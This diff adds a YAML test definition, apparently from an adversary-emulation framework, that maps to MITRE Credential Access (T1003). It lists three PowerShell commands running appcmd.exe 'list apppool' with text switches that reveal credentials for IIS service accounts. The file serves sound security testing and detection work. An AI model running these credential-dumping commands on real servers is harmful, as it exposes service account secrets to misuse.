@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)
+description: |-
+    AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
+    [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)
+uuid: 6c7a4fd3-5b0b-4b30-a93e-39411b25d889
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: retrieve-microsoft-iis-service-account-credentials-using-appcmd-(using-list)
+      inline: |-
+        C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
+        C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
+        C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
